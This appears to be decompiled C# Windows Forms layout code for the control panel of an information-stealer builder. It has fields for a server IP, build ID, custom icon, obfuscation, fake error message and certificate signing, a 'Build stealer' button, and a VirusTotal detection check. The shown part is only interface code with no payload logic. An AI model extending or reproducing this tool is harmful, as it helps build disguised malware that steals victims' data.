		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.checkConnectionBtn);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.m_a4);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.m_a5);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.m_a6);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.m_a7);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.m_a8);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.m_a9);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.m_aa);
		((System.Windows.Forms.Control)this.builderTab).Controls.Add((System.Windows.Forms.Control)this.m_ab);
		((System.Windows.Forms.Control)this.builderTab).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.builderTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.builderTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.builderTab).Name = "builderTab";
		((System.Windows.Forms.Control)this.builderTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.builderTab).TabIndex = 6;
		((System.Windows.Forms.Control)this.builderTab).Text = "Builder";
		((System.Windows.Forms.Control)this.obfuscateCheckBox).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.obfuscateCheckBox).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.obfuscateCheckBox).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.obfuscateCheckBox).Checked = false;
		((MetroSetCheckBox)this.obfuscateCheckBox).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.obfuscateCheckBox).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.obfuscateCheckBox).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.obfuscateCheckBox).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.obfuscateCheckBox).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.obfuscateCheckBox).Location = new System.Drawing.Point(602, 351);
		((System.Windows.Forms.Control)this.obfuscateCheckBox).Name = "obfuscateCheckBox";
		((MetroSetCheckBox)this.obfuscateCheckBox).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.obfuscateCheckBox).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.obfuscateCheckBox).Style = (Style)1;
		((MetroSetCheckBox)this.obfuscateCheckBox).StyleManager = null;
		((System.Windows.Forms.Control)this.obfuscateCheckBox).TabIndex = 147;
		((MetroSetCheckBox)this.obfuscateCheckBox).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.obfuscateCheckBox).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label59).AutoSize = true;
		((System.Windows.Forms.Control)this.label59).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label59).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label59).Location = new System.Drawing.Point(531, 351);
		((System.Windows.Forms.Control)this.label59).Name = "label59";
		((System.Windows.Forms.Control)this.label59).Size = new System.Drawing.Size(61, 15);
		((System.Windows.Forms.Control)this.label59).TabIndex = 146;
		((System.Windows.Forms.Control)this.label59).Text = "Obfuscate";
		((System.Windows.Forms.Control)this.sendLogByPartsCb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.sendLogByPartsCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.sendLogByPartsCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.sendLogByPartsCb).Checked = true;
		((MetroSetCheckBox)this.sendLogByPartsCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.sendLogByPartsCb).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.sendLogByPartsCb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.sendLogByPartsCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.sendLogByPartsCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.sendLogByPartsCb).Location = new System.Drawing.Point(476, 351);
		((System.Windows.Forms.Control)this.sendLogByPartsCb).Name = "sendLogByPartsCb";
		((MetroSetCheckBox)this.sendLogByPartsCb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.sendLogByPartsCb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.sendLogByPartsCb).Style = (Style)1;
		((MetroSetCheckBox)this.sendLogByPartsCb).StyleManager = null;
		((System.Windows.Forms.Control)this.sendLogByPartsCb).TabIndex = 145;
		((MetroSetCheckBox)this.sendLogByPartsCb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.sendLogByPartsCb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label58).AutoSize = true;
		((System.Windows.Forms.Control)this.label58).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label58).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label58).Location = new System.Drawing.Point(342, 351);
		((System.Windows.Forms.Control)this.label58).Name = "label58";
		((System.Windows.Forms.Control)this.label58).Size = new System.Drawing.Size(101, 15);
		((System.Windows.Forms.Control)this.label58).TabIndex = 144;
		((System.Windows.Forms.Control)this.label58).Text = "Send log by parts:";
		((AnimaTextBox)this.errorMessageTb).Dark = false;
		((System.Windows.Forms.Control)this.errorMessageTb).Location = new System.Drawing.Point(342, 318);
		((AnimaTextBox)this.errorMessageTb).MaxLength = 32767;
		((AnimaTextBox)this.errorMessageTb).MultiLine = false;
		((System.Windows.Forms.Control)this.errorMessageTb).Name = "errorMessageTb";
		((AnimaTextBox)this.errorMessageTb).Numeric = false;
		((AnimaTextBox)this.errorMessageTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.errorMessageTb).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.errorMessageTb).TabIndex = 68;
		((AnimaTextBox)this.errorMessageTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label46).AutoSize = true;
		((System.Windows.Forms.Control)this.label46).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label46).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label46).Location = new System.Drawing.Point(342, 300);
		((System.Windows.Forms.Control)this.label46).Name = "label46";
		((System.Windows.Forms.Control)this.label46).Size = new System.Drawing.Size(84, 15);
		((System.Windows.Forms.Control)this.label46).TabIndex = 67;
		((System.Windows.Forms.Control)this.label46).Text = "Error message:";
		((MetroSetButton)this.proSignButton).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.proSignButton).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.proSignButton).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.proSignButton).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.proSignButton).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.proSignButton).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.proSignButton).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.proSignButton).Location = new System.Drawing.Point(660, 376);
		((System.Windows.Forms.Control)this.proSignButton).Name = "proSignButton";
		((MetroSetButton)this.proSignButton).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.proSignButton).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.proSignButton).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.proSignButton).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.proSignButton).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.proSignButton).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.proSignButton).Size = new System.Drawing.Size(120, 23);
		((MetroSetButton)this.proSignButton).Style = (Style)0;
		((MetroSetButton)this.proSignButton).StyleManager = null;
		((System.Windows.Forms.Control)this.proSignButton).TabIndex = 66;
		((System.Windows.Forms.Control)this.proSignButton).Text = "Sign certificate";
		((MetroSetButton)this.proSignButton).ThemeAuthor = "Narwin";
		((MetroSetButton)this.proSignButton).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.proSignButton).Click += new System.EventHandler(proSignButton_Click);
		((MetroSetButton)this.checkConnectionBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.checkConnectionBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.checkConnectionBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.checkConnectionBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.checkConnectionBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.checkConnectionBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.checkConnectionBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.checkConnectionBtn).Location = new System.Drawing.Point(660, 229);
		((System.Windows.Forms.Control)this.checkConnectionBtn).Name = "checkConnectionBtn";
		((MetroSetButton)this.checkConnectionBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.checkConnectionBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.checkConnectionBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.checkConnectionBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.checkConnectionBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.checkConnectionBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.checkConnectionBtn).Size = new System.Drawing.Size(120, 23);
		((MetroSetButton)this.checkConnectionBtn).Style = (Style)0;
		((MetroSetButton)this.checkConnectionBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.checkConnectionBtn).TabIndex = 65;
		((System.Windows.Forms.Control)this.checkConnectionBtn).Text = "Check connection";
		((MetroSetButton)this.checkConnectionBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.checkConnectionBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.checkConnectionBtn).Click += new System.EventHandler(checkConnectionBtn_Click);
		((AnimaTextBox)this.m_a4).Dark = false;
		((System.Windows.Forms.Control)this.m_a4).Location = new System.Drawing.Point(342, 275);
		((AnimaTextBox)this.m_a4).MaxLength = 32767;
		((AnimaTextBox)this.m_a4).MultiLine = false;
		((System.Windows.Forms.Control)this.m_a4).Name = "buildIdTb";
		((AnimaTextBox)this.m_a4).Numeric = false;
		((AnimaTextBox)this.m_a4).ReadOnly = false;
		((System.Windows.Forms.Control)this.m_a4).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.m_a4).TabIndex = 52;
		((AnimaTextBox)this.m_a4).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.m_a5).AutoSize = true;
		((System.Windows.Forms.Control)this.m_a5).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.m_a5).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.m_a5).Location = new System.Drawing.Point(342, 257);
		((System.Windows.Forms.Control)this.m_a5).Name = "label20";
		((System.Windows.Forms.Control)this.m_a5).Size = new System.Drawing.Size(51, 15);
		((System.Windows.Forms.Control)this.m_a5).TabIndex = 51;
		((System.Windows.Forms.Control)this.m_a5).Text = "Build ID:";
		((AnimaTextBox)this.m_a6).Dark = false;
		((System.Windows.Forms.Control)this.m_a6).Location = new System.Drawing.Point(342, 229);
		((AnimaTextBox)this.m_a6).MaxLength = 32767;
		((AnimaTextBox)this.m_a6).MultiLine = false;
		((System.Windows.Forms.Control)this.m_a6).Name = "serverIpTb";
		((AnimaTextBox)this.m_a6).Numeric = false;
		((AnimaTextBox)this.m_a6).ReadOnly = false;
		((System.Windows.Forms.Control)this.m_a6).Size = new System.Drawing.Size(312, 23);
		((System.Windows.Forms.Control)this.m_a6).TabIndex = 50;
		((AnimaTextBox)this.m_a6).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.m_a7).AutoSize = true;
		((System.Windows.Forms.Control)this.m_a7).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.m_a7).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.m_a7).Location = new System.Drawing.Point(342, 211);
		((System.Windows.Forms.Control)this.m_a7).Name = "label19";
		((System.Windows.Forms.Control)this.m_a7).Size = new System.Drawing.Size(55, 15);
		((System.Windows.Forms.Control)this.m_a7).TabIndex = 49;
		((System.Windows.Forms.Control)this.m_a7).Text = "Server IP:";
		((MetroSetButton)this.m_a8).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a8).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a8).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.m_a8).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.m_a8).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a8).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a8).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.m_a8).Location = new System.Drawing.Point(660, 347);
		((System.Windows.Forms.Control)this.m_a8).Name = "createBuildBtn";
		((MetroSetButton)this.m_a8).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a8).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a8).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.m_a8).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a8).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a8).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.m_a8).Size = new System.Drawing.Size(120, 23);
		((MetroSetButton)this.m_a8).Style = (Style)0;
		((MetroSetButton)this.m_a8).StyleManager = null;
		((System.Windows.Forms.Control)this.m_a8).TabIndex = 48;
		((System.Windows.Forms.Control)this.m_a8).Text = "Build stealer";
		((MetroSetButton)this.m_a8).ThemeAuthor = "Narwin";
		((MetroSetButton)this.m_a8).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.m_a8).Click += new System.EventHandler(a8_Click);
		((MetroSetButton)this.m_a9).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a9).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a9).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.m_a9).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.m_a9).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a9).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a9).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.m_a9).Location = new System.Drawing.Point(715, 183);
		((System.Windows.Forms.Control)this.m_a9).Name = "openIconBtn";
		((MetroSetButton)this.m_a9).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a9).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a9).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.m_a9).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a9).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a9).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.m_a9).Size = new System.Drawing.Size(65, 23);
		((MetroSetButton)this.m_a9).Style = (Style)0;
		((MetroSetButton)this.m_a9).StyleManager = null;
		((System.Windows.Forms.Control)this.m_a9).TabIndex = 47;
		((System.Windows.Forms.Control)this.m_a9).Text = "Open";
		((MetroSetButton)this.m_a9).ThemeAuthor = "Narwin";
		((MetroSetButton)this.m_a9).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.m_a9).Click += new System.EventHandler(a9_Click);
		((AnimaTextBox)this.m_aa).Dark = false;
		((System.Windows.Forms.Control)this.m_aa).Location = new System.Drawing.Point(342, 183);
		((AnimaTextBox)this.m_aa).MaxLength = 32767;
		((AnimaTextBox)this.m_aa).MultiLine = false;
		((System.Windows.Forms.Control)this.m_aa).Name = "iconPath";
		((AnimaTextBox)this.m_aa).Numeric = false;
		((AnimaTextBox)this.m_aa).ReadOnly = false;
		((System.Windows.Forms.Control)this.m_aa).Size = new System.Drawing.Size(367, 23);
		((System.Windows.Forms.Control)this.m_aa).TabIndex = 46;
		((AnimaTextBox)this.m_aa).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.m_ab).AutoSize = true;
		((System.Windows.Forms.Control)this.m_ab).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.m_ab).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.m_ab).Location = new System.Drawing.Point(342, 165);
		((System.Windows.Forms.Control)this.m_ab).Name = "label18";
		((System.Windows.Forms.Control)this.m_ab).Size = new System.Drawing.Size(54, 15);
		((System.Windows.Forms.Control)this.m_ab).TabIndex = 45;
		((System.Windows.Forms.Control)this.m_ab).Text = "Icon File:";
		((System.Windows.Forms.Control)this.m_ac).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.virusTotalTextbox);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.metroSetButton3);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.virusTotalKey);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.label47);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.openVirusTotalFile);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.virustotalFile);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.label48);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider19);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b9);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.ba);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.bb);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.bc);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.bd);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.be);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.m_ad);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.m_ae);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.af);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b0);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b1);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b2);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b3);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b4);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b5);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b6);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b7);
		((System.Windows.Forms.Control)this.m_ac).Controls.Add((System.Windows.Forms.Control)this.b8);
		((System.Windows.Forms.Control)this.m_ac).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.m_ac).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.m_ac).Name = "miscTab";
		((System.Windows.Forms.Control)this.m_ac).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.m_ac).TabIndex = 14;
		((System.Windows.Forms.Control)this.m_ac).Text = "Misc";
		((AnimaTextBox)this.virusTotalTextbox).Dark = false;
		((System.Windows.Forms.Control)this.virusTotalTextbox).Location = new System.Drawing.Point(324, 445);
		((AnimaTextBox)this.virusTotalTextbox).MaxLength = 32767;
		((AnimaTextBox)this.virusTotalTextbox).MultiLine = true;
		((System.Windows.Forms.Control)this.virusTotalTextbox).Name = "virusTotalTextbox";
		((AnimaTextBox)this.virusTotalTextbox).Numeric = false;
		((AnimaTextBox)this.virusTotalTextbox).ReadOnly = true;
		((System.Windows.Forms.Control)this.virusTotalTextbox).Size = new System.Drawing.Size(438, 186);
		((System.Windows.Forms.Control)this.virusTotalTextbox).TabIndex = 129;
		((AnimaTextBox)this.virusTotalTextbox).UseSystemPasswordChar = false;
		((MetroSetButton)this.metroSetButton3).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.metroSetButton3).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.metroSetButton3).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.metroSetButton3).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.metroSetButton3).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.metroSetButton3).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.metroSetButton3).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.metroSetButton3).Location = new System.Drawing.Point(510, 416);
		((System.Windows.Forms.Control)this.metroSetButton3).Name = "metroSetButton3";
		((MetroSetButton)this.metroSetButton3).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.metroSetButton3).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.metroSetButton3).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.metroSetButton3).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.metroSetButton3).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.metroSetButton3).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.metroSetButton3).Size = new System.Drawing.Size(65, 23);
		((MetroSetButton)this.metroSetButton3).Style = (Style)0;
		((MetroSetButton)this.metroSetButton3).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetButton3).TabIndex = 128;
		((System.Windows.Forms.Control)this.metroSetButton3).Text = "Start";
		((MetroSetButton)this.metroSetButton3).ThemeAuthor = "Narwin";
		((MetroSetButton)this.metroSetButton3).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.metroSetButton3).Click += new System.EventHandler(metroSetButton3_Click);
		((AnimaTextBox)this.virusTotalKey).Dark = false;
		((System.Windows.Forms.Control)this.virusTotalKey).Location = new System.Drawing.Point(324, 387);
		((AnimaTextBox)this.virusTotalKey).MaxLength = 32767;
		((AnimaTextBox)this.virusTotalKey).MultiLine = false;
		((System.Windows.Forms.Control)this.virusTotalKey).Name = "virusTotalKey";
		((AnimaTextBox)this.virusTotalKey).Numeric = false;
		((AnimaTextBox)this.virusTotalKey).ReadOnly = false;
		((System.Windows.Forms.Control)this.virusTotalKey).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.virusTotalKey).TabIndex = 122;
		((AnimaTextBox)this.virusTotalKey).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label47).AutoSize = true;
		((System.Windows.Forms.Control)this.label47).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label47).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label47).Location = new System.Drawing.Point(324, 369);
		((System.Windows.Forms.Control)this.label47).Name = "label47";
		((System.Windows.Forms.Control)this.label47).Size = new System.Drawing.Size(67, 15);
		((System.Windows.Forms.Control)this.label47).TabIndex = 121;
		((System.Windows.Forms.Control)this.label47).Text = "VT API Key:";
		((MetroSetButton)this.openVirusTotalFile).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.openVirusTotalFile).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.openVirusTotalFile).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.openVirusTotalFile).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.openVirusTotalFile).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.openVirusTotalFile).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.openVirusTotalFile).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.openVirusTotalFile).Location = new System.Drawing.Point(768, 341);
		((System.Windows.Forms.Control)this.openVirusTotalFile).Name = "openVirusTotalFile";
		((MetroSetButton)this.openVirusTotalFile).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.openVirusTotalFile).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.openVirusTotalFile).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.openVirusTotalFile).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.openVirusTotalFile).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.openVirusTotalFile).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.openVirusTotalFile).Size = new System.Drawing.Size(65, 23);
		((MetroSetButton)this.openVirusTotalFile).Style = (Style)0;
		((MetroSetButton)this.openVirusTotalFile).StyleManager = null;
		((System.Windows.Forms.Control)this.openVirusTotalFile).TabIndex = 120;
		((System.Windows.Forms.Control)this.openVirusTotalFile).Text = "Open";
		((MetroSetButton)this.openVirusTotalFile).ThemeAuthor = "Narwin";
		((MetroSetButton)this.openVirusTotalFile).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.openVirusTotalFile).Click += new System.EventHandler(openVirusTotalFile_Click);
		((AnimaTextBox)this.virustotalFile).Dark = false;
		((System.Windows.Forms.Control)this.virustotalFile).Location = new System.Drawing.Point(324, 341);
		((AnimaTextBox)this.virustotalFile).MaxLength = 32767;
		((AnimaTextBox)this.virustotalFile).MultiLine = false;
		((System.Windows.Forms.Control)this.virustotalFile).Name = "virustotalFile";
		((AnimaTextBox)this.virustotalFile).Numeric = false;
		((AnimaTextBox)this.virustotalFile).ReadOnly = true;
		((System.Windows.Forms.Control)this.virustotalFile).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.virustotalFile).TabIndex = 119;
		((AnimaTextBox)this.virustotalFile).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label48).AutoSize = true;
		((System.Windows.Forms.Control)this.label48).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
